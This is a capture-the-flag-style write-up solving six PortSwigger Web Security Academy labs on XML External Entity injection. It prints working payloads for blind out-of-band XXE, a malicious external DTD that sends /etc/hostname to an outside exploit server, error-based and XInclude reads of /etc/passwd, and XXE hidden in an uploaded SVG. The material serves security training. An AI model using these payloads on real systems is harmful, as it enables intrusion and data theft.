## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **XML External Entity (XXE) Injection**:

**3 Blind XXE with out-of-band interaction**  
<blockquote>
This lab demonstrates exploiting blind XXE vulnerabilities that require out-of-band interaction to confirm and extract data.
</blockquote>

**4 Blind XXE with out-of-band interaction via XML parameter entities**  
<blockquote>
This lab shows advanced blind XXE exploitation using XML parameter entities for out-of-band data retrieval.
</blockquote>

**5 Exploiting blind XXE to exfiltrate data using a malicious external DTD**  
<blockquote>
This lab explains how to use malicious external DTDs to exfiltrate data through blind XXE attacks.
</blockquote>

**6 Exploiting blind XXE to retrieve data via error messages**  
<blockquote>

This lab shows how to exploit blind XXE by causing error messages that leak sensitive information.
</blockquote>

**7 Exploiting XInclude to retrieve files**  
<blockquote>
This lab demonstrates how XInclude can be abused in XXE attacks to retrieve files from the server.
</blockquote>

**8 Exploiting XXE via image file upload**  
<blockquote>
This lab shows how XXE vulnerabilities can be exploited through image file uploads containing malicious XML data.
</blockquote>

---

### LAB 3 - Blind XXE with out-of-band interaction

### Lab Description

![image](https://github.com/user-attachments/assets/6c844e13-9145-4e38-ad89-ff340791bcda)


### Solution

## 🕵️ Detecting Blind XXE with Burp Collaborator

In some applications, direct XXE attacks may return an error or no response at all — indicating **XXE protections** are in place or the results of entity expansion are not reflected in the response.  
This is known as **Blind XXE**.

---

To detect blind xxe in such cases, you can use **out-of-band (OAST)** techniques by forcing the server to interact with an external resource — such as a Burp Collaborator URL.

Clicking on checkstock feature send the following request, 

```xml
POST /product/stock HTTP/1.1
Host: af200a003758a3c805485480033006f.web-security-academy.net
Cookie: session=wddsUKKawFN8qZnb8SyEtJbdsdsdmyhRWxmQ
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://af200a003758a3c805485480033006f.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://af200a003758a3c805485480033006f.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```
To solve the lab we need to make an out bound request to our collaborator server to solve the lab.

For this we can use the following payload

```xml
<!DOCTYPE root [<!ENTITY  % ext SYSTEM "http://burp-collaborator.net/">]>
<stockCheck>
  <productId>%ext;</productId>
  <storeId>1</storeId>
</stockCheck>
```

But in the response we get an error stating that - `Entities are not allowed for security reasons`

Request:

![image](https://github.com/user-attachments/assets/239aa631-2bce-4377-a4fe-595990885da1)

Response:

![image](https://github.com/user-attachments/assets/61f68094-04e1-405d-bade-cabf689aff26)



So instead of using parameterized entities, we use normal entities.


### 📦 Payload for Blind XXE

Replace your entity declaration to point to your **Burp Collaborator** domain (or any controlled external domain):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://r......c.oastify.com"> ]>
<stockCheck>
    <productId>
        &xxe;
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
````

> 🧠 Replace the `oastify.com` domain with your own Burp Collaborator payload URL.

![image](https://github.com/user-attachments/assets/efcb5a8a-0b32-47b7-b7f4-fe183e62492b)


The response states - `Invalid product ID` which is an indicator that there is no productID but still the application may have parsed the entity and made out-bound request to our burp collaborator server.

---

### ✅ Confirming the XXE

1. **Send** the request via Burp Repeater or any HTTP client.
2. Go to **Burp → Collaborator** tab.
3. Click **"Poll now"** to check for any DNS or HTTP interactions.
4. Your request is logged, you’ve confirmed a **Blind XXE** vulnerability.


![image](https://github.com/user-attachments/assets/633294b6-371c-4b42-a6b0-9ffe34a84ffa)

We have solved the lab

![image](https://github.com/user-attachments/assets/00801efe-8326-4cd7-b725-9cff16d7aac0)


---


### 🛠️ Real-World Impact

* Blind XXE can still be exploited for:

  * **SSRF** (Server-Side Request Forgery)
  * **Port Scanning**
  * **File Exfiltration** (via DNS if necessary)
  * **Service Enumeration**



---

### LAB 4 - Blind XXE with out-of-band interaction via XML parameter entities

### Lab Description

![image](https://github.com/user-attachments/assets/062032dd-0124-4157-af7b-4c237cd641ae)


## 📘 Overview: Blind XXE Using Parameter Entities

Sometimes, **regular XXE payloads are blocked** by input filters or hardened XML parsers. In such cases, **parameter entities** offer an alternative method of exploitation.

---

### 🧬 What Are Parameter Entities?

Parameter entities are a special kind of XML entity that:

- Are **declared** using a `%` sign.
- Can **only be referenced within the DTD** (Document Type Definition).
- Are useful in **bypassing filters** that block `<!ENTITY ... SYSTEM ...>` in regular XML content.

---

### 📌 Declaration Syntax

```xml
<!ENTITY % myparameterentity "my parameter entity value" >
````

---

### 📌 Usage

Instead of using `&name;` like regular entities, **parameter entities use** `%name;`:

```xml
%myparameterentity;
```

---

### 🔍 Blind XXE via OOB Detection Using Parameter Entities

If the server doesn't return XXE output in the HTTP response, you can still **detect blind XXE** by monitoring for **out-of-band (OOB)** DNS or HTTP interactions using Burp Collaborator or your own server.

---

### 💣 Sample Payload

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com">
  %xxe;
]>
```

* **Step 1**: Declares a **parameter entity** `%xxe` that fetches content from an attacker-controlled domain.
* **Step 2**: References the entity *inside the DTD*, which triggers a DNS/HTTP request.

✅ **If you observe a hit on your Burp Collaborator domain, the application is vulnerable to Blind XXE**.

---

### 🔐 When to Use

* The server blocks `file://` or regular `SYSTEM` entities.
* You receive no XML error output or leaked content.
* You suspect the XML parser resolves DTDs and external content.



### Solution

Clicking on checkstock feature send the following request, 

```xml
POST /product/stock HTTP/1.1
Host: Da8300cf94a26be480260884005700e8.web-security-academy.net
Cookie: session=sUKKadfdsfwFN8qZnb8SyEtJbdsdsdmyhtyty
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://Da8300cf94a26be480260884005700e8-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://Da8300cf94a26be480260884005700e8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```
To solve the lab we need to make an out bound request to our collaborator server to solve the lab.

For this we can use the following payload

```xml
<!DOCTYPE root [<!ENTITY  % ext SYSTEM "http://burp-collaborator.net/">]>
<stockCheck>
  <productId>%ext;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### 🔹 Modify Request with Parameter Entity Payload

Replace the original XML with the following:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://q6x580qbz3i8x9wutkq9i4bg97fy3ord.oastify.com">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

* Replace `q6x580qbz3i8x9wutkq9i4bg97fy3ord.oastify.com` with your **Burp Collaborator** domain.
* `<!ENTITY % xxe SYSTEM "...">` defines a parameter entity that loads from an external domain.
* `%xxe;` invokes the parameter entity inside the DTD (required for execution).

  ![image](https://github.com/user-attachments/assets/bd29122d-8896-4d82-897e-f81e3ab00587)

---

## 📡 Detect the OOB Interaction

1. Go to **Burp Collaborator** tab.
2. Click **"Poll now"**.
3. If you see **DNS or HTTP interactions**, the lab is vulnerable.

   ![image](https://github.com/user-attachments/assets/a84ddb11-74f8-4d7a-9ec8-e74e635219b2)

4. Lab gets marked as **Solved** automatically after interaction.

   ![image](https://github.com/user-attachments/assets/6262df39-8884-4488-b3b6-2764d298bd72)



### Key Takeaway 

1. **Check if the application accepts XML input**

   * Submit a basic XML payload to confirm that the server processes XML content.

2. **If XML is accepted, attempt to declare an internal entity**

   * Define a simple XML entity within a `DOCTYPE` declaration to test for potential injection.

3. **Try referencing the declared entity in the XML body**

   * If the entity is expanded or triggers a response, it may indicate a vulnerability.

4. **If referencing the entity causes an error or is blocked, test using parameter entities**

   * Parameter entities are used within the DTD and can be leveraged for out-of-band (OOB) interaction, useful for detecting blind XXE vulnerabilities.


---

### LAB 5 - Exploiting blind XXE to exfiltrate data using a malicious external DTD

### Lab Description

 ![image](https://github.com/user-attachments/assets/82bc42c3-ce9e-4841-b067-28ab0ee36810)

### Solution

### 🔐 Step 1: Host Malicious DTD on Exploit Server

Create the following DTD file (`malicious.dtd`) and upload it to your exploit server:
 > Note you can also used your collabrator server so you get response there instamce of this  https://exploit-0ad2004004843a168182a2f5018800b6.exploit-server.net/?x=%file

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0ad2004004843a168182a2f5018800b6.exploit-server.net/?x=%file;'>">
%eval;
%exfiltrate;
```
> 💡 **Note:** Instead of using the provided exploit server, you can optionally host the DTD on your own **Burp Collaborator server** or **OAST domain** (e.g., `https://your-collaborator-id.oastify.com/?x=%file`).
> This approach allows you to directly observe DNS or HTTP interactions triggered by the vulnerable XML parser, making it ideal for blind XXE exploitation and real-time validation.

>  ![image](https://github.com/user-attachments/assets/90b98c32-3675-4aad-aafe-9bb7ce8cec8b)


#### 🔍 Explanation:

* `<!ENTITY % file SYSTEM "file:///etc/hostname">`
  → Loads the contents of `/etc/hostname` into the `file` entity.

* `<!ENTITY % eval "...">`
  → Dynamically defines another entity, `exfiltrate`, to send the file contents via HTTP to your server.

* `%eval;`
  → Triggers evaluation of the new declaration.

* `%exfiltrate;`
  → Executes the request to send the file content as a query parameter.

---

### 📦 Step 2: Send the XML Payload to Target Application

Submit the following XML payload to the vulnerable "Check stock" feature:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://exploit-0ad2004004843a168182a2f5018800b6.exploit-server.net/malicious.dtd">
  %xxe;
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

 ![image](https://github.com/user-attachments/assets/2f828841-fd9e-46e7-913e-0cd1f75b01fe)

---

### 📡 Step 3: Monitor Exploit Server for Interaction

* Go to your **exploit-server access logs**.
* You should see a request like:

  ```
  GET /?x=TARGET-HOSTNAME
  ```

![image](https://github.com/user-attachments/assets/88481fb1-d1a1-40b9-84bc-11a7c48c4252)

  This confirms that the XXE payload successfully caused the server to fetch and process the malicious DTD, and exfiltrate the hostname.

   Submit the hostname to solve the lab.
    
  ![image](https://github.com/user-attachments/assets/04d525f1-8a3a-48e8-835a-c33458f5088a)

---

### ✅ Key Takeaway

*  IF WE CAN'T EXFILTRATE DATA IN-BAND, TRY CALLING OUR EXTERNALLY-HOSTED SERVER

*  IF THERE'S NO EGRESS FILTERING WE CAN BEGIN OOB DATA EXFILTRATION
---

### LAB 6 - Exploiting blind XXE to retrieve data via error messages

### Lab Description

![image](https://github.com/user-attachments/assets/4ccc1ff1-a225-4dc6-8126-4d9abcc6fd54)


### Solution



### 📁 Step 1: Host Malicious DTD on Exploit Server

Create and upload the following **malicious DTD** to your exploit server:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

![image](https://github.com/user-attachments/assets/c7ec4834-0984-4340-abf8-fc05f065d42d)


#### 💡 How It Works:

* `%file` loads the contents of `/etc/passwd`.
* `%eval` dynamically defines a new parameter entity named `error` that references a non-existent file path containing `%file`.
* `%error` triggers the error by attempting to access an invalid path. This forces the XML parser to throw an error message that includes the content of `/etc/passwd`.

---

### 📤 Step 2: Send XXE Payload to Target

Send the following XML payload to the **"Check stock"** feature of the target application:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://exploit-0a89003a032db21e8245e131014c005d.exploit-server.net/malicious.dtd">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

![image](https://github.com/user-attachments/assets/b6b7ebc8-a0d4-448e-8e10-e3961fc31a7c)

---

### 📋 Expected Behavior

Since the application does **not display stock check results**, but **does return XML parsing errors**, the malicious payload triggers a parsing failure. The error message will include the expanded contents of `/etc/passwd` due to the forced invalid path.

Thus we can see lab is solved

![image](https://github.com/user-attachments/assets/231e59c9-2232-4739-a653-22a2e72c4127)

---


### ✅ Key Takeaway

#### 📄 Reading Multi-line Data via Error-Based XXE

1. **Use FTP or file URI** — Remember, XXE can abuse various URI schemes like `ftp://`, `file://`, etc.
2. **Trigger XML Parsing Errors** — If the app reflects XML parsing errors, you can embed file content in the error response.

---

#### 💥 Execution Logic

- First, load a malicious external DTD from your server.
- The external DTD:
  1. Loads the contents of `/etc/passwd` into a parameter entity (`%file`).
  2. Constructs a dynamic URL like `/nonexistent/%file`.
  3. When this path is requested, it triggers a parsing error since `/nonexistent/` does not exist.
- The error message reveals:
```

Error: file not found: /nonexistent/root\:x:0:0\:root:/root:/bin/bash

```

---

#### ⚠️ Error-Based Exfiltration Constraints

1. Even though **errors are reflected in-band**, you still need **OOB interaction** to stack parameter entities using external DTD.
2. The application **must return XML parsing errors** in the HTTP response to expose the content of the multi-line file.

---



### LAB 7 - Exploiting XInclude to retrieve files

### Lab Description

![image](https://github.com/user-attachments/assets/09c6835b-4bca-4425-a00a-3b2bd1586f1d)

### Solution


### 🔧 XInclude Use Cases

**When to Use XInclude:**

1. ✅ You do **not have control over the entire XML document** — only over a **fragment** (e.g., a parameter like `productId`).
2. ✅ The application **reflects or processes the content** of the element you control.

---

### 🧪 XInclude Payload Example

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
````

This attempts to include the contents of `/etc/passwd` in the XML response.

---

### 📬 Initial Request

![image](https://github.com/user-attachments/assets/4daca3af-8ebd-48b9-9a69-e5212ccaa6a2)

>  Usually if an API accepts JSON data, then most probably it will also accept xml data too. We can change the content type by using `content-type-converter`

> ![image](https://github.com/user-attachments/assets/bf2cc6e4-8eab-417c-87fe-7dcf00096993)



In this lab sending JSON data didn't work.

We will used below payload:

```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
````

To inject this payload into a **specific parameter** (e.g., `productId`), URL-encode the XML and send it in the body:

```http
POST /product/stock HTTP/2
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
...

productId=%3Cfoo+xmlns%3Axi%3D%22http%3A//www.w3.org/2001/XInclude%22%3E%3Cxi%3Ainclude+parse%3D%22text%22+href%3D%22file%3A///etc/passwd%22/%3E%3C/foo%3E&storeId=1
```
![image](https://github.com/user-attachments/assets/c33319fe-db5f-4c3e-8dfe-daf88d2d059e)

![image](https://github.com/user-attachments/assets/2f72dd4d-771b-4323-80ab-a420c4e68678)

---

### ✅ Lab Success Criteria

* You **do not control the full XML structure** but can inject inside a tag or attribute.
* The server uses an XML parser that supports **XInclude processing**.
* Submitting the payload should cause the application to **return the contents** of the target file (`/etc/passwd`).

---

> 🔐 XInclude attacks depend heavily on the **parser configuration**. Many secure parsers disable XInclude by default.


---

### LAB 8 - Exploiting XXE via image file upload

### Lab Description
![image](https://github.com/user-attachments/assets/3c2d03d6-fc39-4afa-9709-0608d033c2e7)

### Solution


## 🖼️ SVG-Based XXE Exploitation

### 🔍 File Type Awareness

When analyzing for potential XXE vulnerabilities, **keep an eye on the accepted file types**:

- Formats like `.docx`, `.xlsx`, and `.pptx` are actually ZIP archives containing **XML files** inside.
- If the application accepts images like `.png` or `.jpg`, try uploading an `.svg` file.
  - **SVG uses XML**, and if not properly validated, it can be abused for XXE.

---

Svg file used xml to for building svg file below is svg example file in xml

![image](https://github.com/user-attachments/assets/bafeafe0-e5e0-4e05-8c35-1694e2cb8e8c)



### ⚙️ Step-by-Step Attack Flow

We can see  the image upload process in below image

![image](https://github.com/user-attachments/assets/31d72ee5-2279-460f-b2f1-945d0de1e1e9)

#### 🧪 Step 1: Test for OOB Interaction (Collaborator Check)


Intercept above request

![image](https://github.com/user-attachments/assets/0bd00ff1-e04f-4912-8b66-26522d39cab5)

Modify the request:

- Change the uploaded file to `test.svg`
- Set header: `Content-Type: image/svg+xml`
- Payload to test DNS request:

<pre>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://<strong>YOUR-COLLABORATOR-ID</strong>.oastify.com"&gt; ]&gt;
&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
  &lt;text&gt;&amp;xxe;&lt;/text&gt;
&lt;/svg&gt;
</pre>

![image](https://github.com/user-attachments/assets/deb44cfb-ebcb-4184-a3e4-d3c2eb09900d)


✅ If your **Burp Collaborator** gets a ping, the parser is vulnerable to XXE.


The server returns a 500 error code but the connections were generated:

![image](https://github.com/user-attachments/assets/fc101481-fc13-4f33-8e5f-19153fe612a5)


---

#### 🔓 Step 2: Local File Read via XXE

Now exfiltrate the contents of `/etc/hostname`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="300" height="200" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
````

🟢 Upload this as `test.svg`, attach it as your avatar, and submit the comment.

🖼 When you open your avatar in a new tab, the **contents of `/etc/hostname`** (e.g., `81da8cd96d3a`) will be visible inside the image.

 ![image](https://github.com/user-attachments/assets/941423e0-91fe-4248-85aa-670ef82cd206)

 If successful, the image renders the server's hostname.
    
  ![image](https://github.com/user-attachments/assets/b0a0abeb-fb96-4fed-a45a-12cb5420b2da)

  Submit the name of the hostname to solve the lab.

   ![image](https://github.com/user-attachments/assets/4e575b03-6137-4a07-9116-1a8fe4995024)

---


### 📌 Key Takeaways

* SVG files are **XML-based**, making them a good candidate for XXE if accepted.
* Use `image/svg+xml` content type during upload.
* Use **Apache Batik**, **lxml**, or other XML libraries to test locally.
* If the app doesn't render in response, test for **Out-of-Band (OOB)** XXE using Burp Collaborator.

---

### 🧠 Pro Tip

Many image processing pipelines (like Batik) parse SVGs and **execute embedded XML**, so even without full control over the backend, you can leak sensitive files if the image is rendered.


---

